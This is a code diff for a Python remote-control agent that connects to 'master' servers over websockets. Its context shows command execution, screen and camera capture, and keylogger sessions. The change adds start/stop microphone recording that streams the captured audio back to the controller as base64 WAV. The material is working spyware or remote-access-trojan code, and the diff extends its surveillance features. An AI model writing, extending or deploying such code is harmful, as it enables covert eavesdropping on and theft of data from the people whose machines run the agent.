@@ -14,6 +14,8 @@ import base64, io
 import shlex
 import shutil
 import ssl, hashlib
+import threading
+import numpy as np  # type: ignore
 from urllib.parse import urlparse
 
 # Ensure Windows supports asyncio subprocesses
@@ -50,6 +52,11 @@ SCREEN_DEFAULT_QUALITY = int(os.getenv('SCREEN_QUALITY', '60'))  # JPEG 1-95
 REMOTE_CONTROL_ENABLED = os.getenv('REMOTE_CONTROL_ENABLED', '1').lower() in ('1','true','yes','on')
 SCREEN_AUTO_START = os.getenv('SCREEN_AUTO_START', '0').lower() in ('1','true','yes','on')
 CAMERA_ENABLED = os.getenv('CAMERA_ENABLED', '1').lower() in ('1','true','yes','on')
+# Audio settings
+AUDIO_ENABLED = os.getenv('AUDIO_ENABLED', '0').lower() in ('1','true','yes','on')
+AUDIO_SAMPLE_RATE = int(os.getenv('AUDIO_SAMPLE_RATE', '44100'))
+AUDIO_CHANNELS = int(os.getenv('AUDIO_CHANNELS', '1'))
+AUDIO_MAX_SECONDS = int(os.getenv('AUDIO_MAX_SECONDS', '300'))
 # TLS pinning (optional)
 MASTER_CERT_SHA256 = (os.getenv('MASTER_CERT_SHA256', '') or '').strip().lower().replace(':','')
 MASTER_CA_PEM = os.getenv('MASTER_CA_PEM', '')
@@ -927,6 +934,8 @@ screen_sessions: dict[Any, dict] = {}
 camera_sessions: dict[Any, dict] = {}
 # Keylogger sessions per master connection
 keylog_sessions: dict[Any, Any] = {}
+# Audio sessions per master connection
+audio_sessions: dict[Any, dict] = {}
 
 async def _connect_one_master(url: str):
     global command_running, queue_task, queue_current_proc, queue_started_at, command_queue, master_stop, master_urls
@@ -1055,34 +1064,87 @@ async def _connect_one_master(url: str):
                             continue
                         # Interactive session control
                         # Camera start
-                        # Audio record (one-shot)
+# Audio record start/stop
                         if isinstance(data, dict) and data.get("type") == "audio_start":
-                            try:
-                                dur = max(1, min(300, int(data.get("duration") or 10)))
-                            except Exception:
-                                dur = 10
-                            await _send_line(ws, "output", f"[audio] recording {dur}s...\n")
-                            try:
-                                def _record_sync(seconds: int) -> str:
+                            if not AUDIO_ENABLED:
+                                try:
+                                    await ws.send(json.dumps({"error": "[Audio] Disabled on agent (AUDIO_ENABLED=0)\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            if ws in audio_sessions and audio_sessions[ws].get("running"):
+                                try:
+                                    await ws.send(json.dumps({"output": "[Audio already running]\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            rate = max(8000, min(48000, int(AUDIO_SAMPLE_RATE)))
+                            ch = 1 if int(AUDIO_CHANNELS) <= 1 else 2
+                            max_sec = max(1, int(AUDIO_MAX_SECONDS))
+                            buf = io.BytesIO()
+                            stop_ev = threading.Event()
+                            def _cb(indata, frames, t, status):
+                                try:
+                                    buf.write(indata.copy().tobytes())
+                                except Exception:
+                                    pass
+                            def _thread_rec():
+                                try:
                                     import sounddevice as sd  # type: ignore
-                                    import soundfile as sf    # type: ignore
-                                    import numpy as np        # type: ignore
-                                    rate = 44100
-                                    channels = 1
-                                    data = sd.rec(int(seconds * rate), samplerate=rate, channels=channels, dtype='int16')
-                                    sd.wait()
-                                    buf = io.BytesIO()
-                                    sf.write(buf, data, rate, format='WAV')
-                                    raw = buf.getvalue()
-                                    return 'data:audio/wav;base64,' + base64.b64encode(raw).decode()
-                                durl = await asyncio.to_thread(_record_sync, dur)
+                                    with sd.InputStream(samplerate=rate, channels=ch, dtype='int16', callback=_cb):
+                                        start_t = time.time()
+                                        while not stop_ev.is_set():
+                                            if (time.time() - start_t) >= max_sec:
+                                                stop_ev.set()
+                                                break
+                                            time.sleep(0.1)
+                                except Exception:
+                                    pass
+                            thr = threading.Thread(target=_thread_rec, daemon=True)
+                            thr.start()
+                            audio_sessions[ws] = {"running": True, "stop": stop_ev, "thr": thr, "buf": buf, "rate": rate, "ch": ch}
+                            await _send_line(ws, "output", f"[Audio] recording... (max {max_sec}s)\n")
+                            continue
+                        if isinstance(data, dict) and data.get("type") == "audio_stop":
+                            sess = audio_sessions.get(ws)
+                            if not sess or not sess.get("running"):
+                                try:
+                                    await ws.send(json.dumps({"output": "[Audio not running]\n"}))
+                                except Exception:
+                                    pass
+                                continue
+                            try:
+                                sess["stop"].set()
+                                try:
+                                    sess["thr"].join(timeout=2.0)
+                                except Exception:
+                                    pass
+                                raw_pcm = sess.get("buf").getvalue()
+                                rate = int(sess.get("rate") or AUDIO_SAMPLE_RATE)
+                                ch = int(sess.get("ch") or AUDIO_CHANNELS)
+                                # Wrap PCM to WAV
+                                try:
+                                    import soundfile as sf  # type: ignore
+                                    pcm_arr = np.frombuffer(raw_pcm, dtype=np.int16)
+                                    if ch > 1:
+                                        pcm_arr = pcm_arr.reshape((-1, ch))
+                                    out = io.BytesIO()
+                                    sf.write(out, pcm_arr, rate, format='WAV')
+                                    wav_bytes = out.getvalue()
+                                except Exception:
+                                    # Fallback: send raw PCM as wav-less
+                                    wav_bytes = raw_pcm
+                                durl = 'data:audio/wav;base64,' + base64.b64encode(wav_bytes).decode()
                                 try:
                                     await ws.send(json.dumps({"type": "audio_segment", "data": durl}))
                                 except Exception:
                                     pass
-                                await _send_line(ws, "output", "[audio] done\n")
-                            except Exception as e:
-                                await _send_line(ws, "error", f"[audio] failed: {e}\n")
+                                await _send_line(ws, "output", "[Audio] saved\n")
+                            finally:
+                                try:
+                                    audio_sessions.pop(ws, None)
+                                except Exception:
+                                    pass
                             continue
                         if isinstance(data, dict) and data.get("type") == "masters_list":
                             try:
